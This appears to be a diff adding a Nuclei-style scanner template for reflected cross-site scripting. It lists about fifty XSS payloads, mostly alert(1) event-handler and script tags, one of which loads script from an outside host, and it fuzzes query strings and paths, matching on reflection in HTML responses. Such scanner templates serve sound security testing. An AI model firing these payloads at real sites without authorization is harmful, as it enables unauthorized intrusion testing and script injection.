@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<div draggable=\"true\" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></script>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<sub onpaste=\"alert(1)\" contenteditable>test</sub>"
+        - "<colgroup onclick=\"alert(1)\">test</colgroup>"
+        - "<font id=x tabindex=1 onfocusin=alert(1)></font><input autofocus>"
+        - "<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext><input autofocus>"
+        - "<iframe srcdoc=\"&lt;img/src=x/onerror=javascript:alert(&apos;XSS&apos;)>\"></iframe>"
+        - "<svg><script/onload=alert(1)>"
+        - "<SCRIPT>alert('XSS')</SCRIPT>//"
+        - "<input type=number onkeyup=alert(1)><input type=image onload=alert(1)>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>"
+        - "<optgroup onbeforepaste=\"alert(1)\" contenteditable>test</optgroup>"
+        - "<svg><video src=\"http://www.ietf.org/avt/txtbin/copyofcorkami.txt\">"
+        - "<xmp draggable=\"true\" ondragenter=\"alert(1)\">test</xmp>"
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;"
+        - "<time onclick=\"alert(1)\">test</time>"
+        - "<svg><foreignObject xlink:href=\"data:image/svg+xml&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;\">"
+        - "<;SCRIPT SRC=\";http://ha.ckers.org/xss.js\";>;"
+        - "<sub id=x tabindex=1 onactivate=alert(1)></sub><input autofocus>"
+        - "<style>@keyframes x{}</style><figcaption style=\"animation-name:x\" onanimationend=\"alert(1)\"></figcaption>"
+        - "<script>alert(1)</script>"
+        - "<SCRIPT>alert(\"xss\");</SCRIPT>"
+        - "<tr onkeypress=\"alert(1)\" contenteditable>test</tr>"
+        - "<style>@keyframes slidein {}</style><tfoot style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></tfoot>"
+        - "<style>@keyframes slidein {}</style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></dialog>"
+        - "<track draggable=\"true\" ondragenter=\"alert(1)\">test</track>"
+        - "<script>alert('XSS')</script>"
+        - "<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>"
+        - "<svg><title>XSS Payload</title></svg>"
+        - "<svg><script>alert(1)</script>"
+        - "<svg><script xlink:href=data:text/javascript,\"alert(1)\"></script></svg>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">"
+        - "<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<basefont id=x tabindex=1 onactivate=alert(1)></basefont><input autofocus>"
+        - "<style>@keyframes x{}</style><object style=\"animation-name:x\" onanimationstart=\"alert(1)\"></object>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><link id=x ondrop=alert(1) contenteditable>drop here</link>"
+        - "<marquee style=\"x:\\expression(javascript:alert(1))\">"
+        - "<time onmousemove=\"alert(1)\">test</time>"
+        - "<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>"
+        - "<SCRIPT>alert(1)</script>"
+        - "<SCRIPT>alert(88)</SCRIPT>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<del onbeforepaste=\"alert(1)\" contenteditable>test</del>"
+        - "<del id=x tabindex=1 onfocusin=alert(1)></del>"
+        - "<mark onbeforecut=\"alert(1)\" contenteditable>test</mark>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
